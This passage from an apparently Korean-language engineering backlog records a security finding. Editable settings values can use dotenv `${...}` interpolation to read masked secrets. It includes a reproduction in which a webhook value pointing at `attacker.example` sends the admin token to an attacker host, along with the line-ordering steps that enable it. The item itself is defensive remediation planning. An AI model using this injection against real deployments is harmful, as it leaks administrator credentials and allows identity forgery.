...
- [ ] 쓰기 인용과 기동 스크립트 파싱 가운데 무엇을 고칠지 정함
- [ ] 세 파서(python-dotenv·bash·Next.js)가 택한 형식을 같게 읽는지 확인
- [ ] 명령 치환·백틱·세미콜론이 실행되지 않는 것을 확인하는 검사 추가

### [INFRA-052] 설정 화면의 값이 `${...}` 로 가려 둔 비밀을 끌어다 쓴다
- 카테고리: 인프라 | 티어: T3(`.env` 접촉) | 근거: 2026-09-08 `[INFRA-044]` 사이클의
  `oh-my-claudecode:security-reviewer` 지적 [F4](확신도 높음). 재현해 확인했습니다.
- python-dotenv 와 `@next/env` 는 값 안의 `${VAR}` 를 **보간합니다.** 그래서 편집 가능한
  키의 값에 `${ADMIN_API_TOKEN}` 이나 `${INTERNAL_IDENTITY_SECRET}` 을 넣으면, 읽기 필터로
  화면에서 가려 둔 값이 그 키의 실제 값이 됩니다.
- **`[INFRA-044]` 의 개행 필터로도 `[INFRA-049]` 의 `source` 제거로도 막히지 않습니다.**
  원인이 셸이 아니라 dotenv 파서 쪽이라 별개 항목입니다.
- 보간은 참조 대상이 **앞줄에 있거나** `os.environ` 에 이미 있을 때 성립합니다. 실제
  `.env` 는 `ADMIN_API_TOKEN` 과 `INTERNAL_IDENTITY_SECRET` 이 마지막 두 줄이라 기존 키를
  갱신하는 경로로는 성립하지 않습니다. **그러나 파일에 없는 키는 끝에 붙습니다.**
  `EDITABLE_ENV_KEYS` 가운데 `AI_PROVIDER` 와 `GOOGLE_SEARCH_ENGINE_ID` 가 여기 해당하고,
  이미 있는 키도 **빈 값으로 한 번 저장해 줄을 지운 뒤 다시 저장하면** 끝으로 옮겨집니다.
- 재현: 웹훅을 빈 값으로 저장해 줄을 지우고
  `DISCORD_WEBHOOK_URL=https://attacker.example/${ADMIN_API_TOKEN}` 을 저장하면 보간된 값이
  `https://attacker.example/FAKE-ADMIN-TOKEN` 이 됩니다. 알림 발송이 그 주소로 POST 를 보내므로
  **관리자 토큰이 공격자 서버로 나갑니다.** `AI_PROVIDER=${INTERNAL_IDENTITY_SECRET}` 도 같은
  방식으로 성립하며, 그 비밀이 새면 누구든 관리자 신원을 위조할 수 있습니다.
- 막는 방향 둘을 설계에서 정합니다. 값에서 `${` 를 거르는 것과, `.env` 를 읽는 쪽에서 보간을
  끄는 것입니다. 후자는 `load_dotenv` 와 `@next/env` 양쪽에서 가능한지 먼저 확인해야 합니다.
- 빈 값 저장이 줄을 지우고 다시 저장이 끝에 붙이는 동작(`common_env_service.py:133-135` 와
  `:140-149`) 자체도 함께 봅니다. 순서를 공격자가 정할 수 있는 것이 이 결함의 절반입니다.
- QA 시나리오: `${ADMIN_API_TOKEN}` 을 넣어 저장해도 그 값이 보간되지 않는다
- [ ] `${...}` 를 값에서 거를지, 읽는 쪽에서 보간을 끌지 정함
- [ ] `load_dotenv` 와 `@next/env` 에서 보간을 끌 수 있는지 확인
- [ ] 편집 가능한 키의 값에 다른 키를 참조해도 그 값이 실리지 않는 것을 확인하는 검사 추가
